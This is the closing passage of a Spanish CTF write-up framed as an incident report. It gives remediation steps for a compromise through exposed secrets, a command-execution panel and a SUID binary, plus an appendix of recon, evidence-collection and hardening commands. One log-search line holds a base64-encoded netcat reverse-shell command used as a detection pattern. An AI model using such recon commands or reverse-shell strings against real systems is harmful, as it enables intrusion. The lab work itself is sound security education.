- El compromiso se produjo por una concatenación de errores técnicos y de proceso: secretos expuestos + funcionalidad de ejecución de comandos en una interfaz pública + presencia de un binario SUID inseguro. El vector es clásico en entornos donde no hay separación clara entre desarrollo y producción, ni controles de seguridad integrados en el ciclo de vida del software. Las acciones inmediatas (aislamiento, recolección de evidencia, desactivar SUID y restringir el panel) deben ejecutarse de inmediato. A medio plazo, implantar gestión centralizada de secretos, SAST/DAST en CI/CD, hardening y un programa de revisión continua de binarios privilegiados. Con estas medidas, el riesgo puede reducirse a niveles aceptables; sin ellas, la exposición organizacional permanece alta.

## 16) Acciones propuestas (resumen accionable, lista corta para el director)
- Aislar y contener el host ahora.
- Preservar evidencia y abrir incidente en ticketing.
- Retirar bit SUID del binario sospechoso y mover a cuarentena.
- Rotar todas las credenciales expuestas.
- Cerrar/poner en mantenimiento panel /admin hasta parche.
- Auditar repositorios por secretos y eliminar historial si procede.
- Programar pentest de verificación post-remediación.

## 17) Contactos y responsabilidades (sugerido)
- Infra / Contención: Equipo Infra / Ops
- Seguridad / Forense: Equipo SecOps / IR
- Dev / App Owner: Equipo de Desarrollo responsable del panel
- DevOps / Secrets: Equipo DevOps para migración a Vault

## 18) Apéndice rápido — comandos clave

```
# Recon & enum
ip a
netdiscover -i eth0
sudo nmap -sV -sC -T4 192.168.131.130 -oN nmap.out
gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/common.txt

# Evidence (copy before changes)
mkdir -p /tmp/evidence && cd /tmp/evidence
cp /var/log/httpd/access_log ./access_log 2>/dev/null || cp /var/log/apache2/access.log ./access_log
cp /var/log/httpd/error_log ./error_log 2>/dev/null || cp /var/log/apache2/error.log ./error_log
cp /var/log/auth.log ./auth_log 2>/dev/null || cp /var/log/secure ./auth_log 2>/dev/null
cp /usr/bin/reset_root ./reset_root.bin && sha256sum ./reset_root.bin > reset_root.bin.sha256
for f in /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe; do [ -e "$f" ] && cp "$f" ./; done
tar czf /root/evidence_$(date +%F_%T).tgz ./

# Containment example: disable SUID
sudo chmod u-s /usr/bin/reset_root
sudo mv /usr/bin/reset_root /root/quarantine_reset_root.bin
sudo sha256sum /root/quarantine_reset_root.bin > /root/quarantine_reset_root.bin.sha256

# Search for SUIDs / capabilities
find / -perm -4000 -type f -ls > /tmp/suid_list.txt
getcap -r / 2>/dev/null > /tmp/capabilities.txt

# Verify artifacts removal
find / -perm -4000 -type f -ls
ls -la /dev/shm | egrep 'kHgTFI5G|Zw7bV9U5' || echo "OK"
grep -R "bmMgLWUgL2Jpbi9iYXNo" /var/log/httpd/* || echo "OK"
```

Este CTF expone fallos frecuentes en entornos reales:
- Gestión inadecuada de secretos.
- Funcionalidades peligrosas en producción.
- Mal diseño de binarios privilegiados.

La metodología usada permitió documentar la cadena de ataque y establecer acciones correctivas claras. En un entorno real, este escenario habría implicado **compromiso total** y potencial **movimiento lateral** hacia otros sistemas.

---

**#CTF #HackingÉtico #Ciberseguridad #Pentesting #Linux #Auditoría #BlueTeam #RedTeam**
